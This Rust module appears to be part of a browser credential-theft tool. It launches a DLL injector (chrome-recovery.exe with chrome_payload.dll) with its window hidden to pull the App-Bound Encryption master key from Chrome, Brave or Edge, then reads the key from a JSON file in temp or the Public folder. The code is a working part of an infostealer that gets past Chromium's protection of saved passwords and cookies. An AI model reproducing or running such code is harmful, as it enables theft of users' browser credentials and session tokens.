//! Chromium App-Bound key recovery via DLL injection (chrome-recovery + chrome_payload.dll).

use std::{
    fs,
    path::PathBuf,
    process::Command,
    thread,
    time::Duration,
};

#[cfg(windows)]
use std::os::windows::process::CommandExt;

use serde_json::Value;

const PUBLIC_RESULT: &str = r"C:\Users\Public\chrome_recovery_result.json";
const CREATE_NO_WINDOW: u32 = 0x0800_0000;

fn result_paths() -> Vec<PathBuf> {
    vec![
        std::env::temp_dir().join("chrome_recovery_result.json"),
        PathBuf::from(PUBLIC_RESULT),
    ]
}

fn find_injector() -> Option<PathBuf> {
    let mut dirs = Vec::new();
    if let Ok(exe) = std::env::current_exe() {
        if let Some(d) = exe.parent() {
            dirs.push(d.to_path_buf());
        }
    }
    if let Ok(cwd) = std::env::current_dir() {
        dirs.push(cwd);
    }
    dirs.push(PathBuf::from("release"));

    for dir in dirs {
        let inj = dir.join("chrome-recovery.exe");
        let dll = dir.join("chrome_payload.dll");
        if inj.exists() && dll.exists() {
            return Some(inj);
        }
    }
    None
}

fn browser_filter(browser_name: &str) -> Option<&'static str> {
    match browser_name {
        "Chrome" => Some("chrome"),
        "Brave" => Some("brave"),
        "Edge" => Some("edge"),
        _ => None,
    }
}

fn hex_to_key(hex: &str) -> Option<Vec<u8>> {
    if hex.len() != 64 {
        return None;
    }
    (0..hex.len())
        .step_by(2)
        .map(|i| u8::from_str_radix(&hex[i..i + 2], 16).ok())
        .collect()
}

fn read_master_key_from_results() -> Option<Vec<u8>> {
    for path in result_paths() {
        if !path.exists() {
            continue;
        }
        let raw = fs::read_to_string(&path).ok()?;
        let json: Value = serde_json::from_str(&raw).ok()?;
        if let Some(err) = json.get("error").and_then(|e| e.as_str()) {
            eprintln!("[chrome-inject] {err}");
            return None;
        }
        let hex = json.get("master_key_hex")?.as_str()?;
        return hex_to_key(hex);
    }
    None
}

/// Run chrome-recovery.exe for a Chromium browser and return the 32-byte app-bound master key.
pub fn fetch_app_bound_key(browser_name: &str) -> Option<Vec<u8>> {
    let filter = browser_filter(browser_name)?;
    let injector = find_injector()?;

    for path in result_paths() {
        let _ = fs::remove_file(path);
    }

    let injector_dir = injector.parent()?.to_path_buf();
    let mut cmd = Command::new(&injector);
    cmd.arg(filter)
        .arg("--key-only")
        .current_dir(&injector_dir);

    #[cfg(windows)]
    cmd.creation_flags(CREATE_NO_WINDOW);

    let status = cmd.status().ok()?;

    if !status.success() {
        eprintln!("[chrome-inject] chrome-recovery exited with {status}");
    }

    for _ in 0..45 {
        if let Some(key) = read_master_key_from_results() {
            if key.len() == 32 {
                return Some(key);
            }
        }
        thread::sleep(Duration::from_secs(1));
    }

    eprintln!("[chrome-inject] timeout waiting for recovery result ({browser_name})");
    None
}
